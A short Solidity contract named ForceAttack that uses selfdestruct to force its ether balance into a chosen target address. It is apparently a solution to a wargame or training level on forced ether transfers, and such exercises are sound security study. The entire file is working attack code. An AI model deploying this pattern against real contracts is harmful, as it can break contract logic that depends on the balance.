// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    address private immutable force;
    constructor(address _force){
        force = _force;
    }

    function attack() public payable {
        require(msg.value > 0);
        address payable ForceAddress = payable(force);
        selfdestruct(ForceAddress);
    }
}
